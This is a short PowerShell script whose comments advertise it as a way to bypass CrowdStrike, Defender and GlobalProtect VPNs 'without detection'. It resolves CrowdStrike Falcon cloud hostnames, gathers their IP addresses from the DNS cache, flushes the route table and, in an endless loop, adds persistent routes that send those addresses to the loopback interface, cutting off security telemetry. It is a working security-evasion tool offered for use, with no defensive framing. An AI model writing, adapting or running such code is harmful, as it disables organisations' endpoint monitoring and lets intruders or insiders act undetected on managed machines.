# This can be used to bypass Crowdstrike, Defender, And Globalprotect full-tunnel VPNs without detection. 
# You'll need to add your own defender links to the target_URLs
# You'll also need to add your own addresses for Globalprotect VPNs, but it's verified to work. 

#CS IP Links https://www.dell.com/support/kbdoc/en-lv/000177899/crowdstrike-falcon-sensor-system-requirements
#CS IP Links https://github.com/simonsigre/crowdstrike_falcon-ipaddresses/blob/master/cs_falcon_commercial_cloud

$target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
$Regex_Lookups = @()#Fill this in with sites you want to block.
$IPs =@() #fill this with IPs you know you want to block.


$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}
Get-DNSClientcache | foreach-object{$test = $_|out-string; if ($test -like '*asus*'){IPs += $_.data}}



$IPs

$InterfaceAlias = "*Loopback*"
route /f
# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
while ($true){
    $IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
     }
            
}
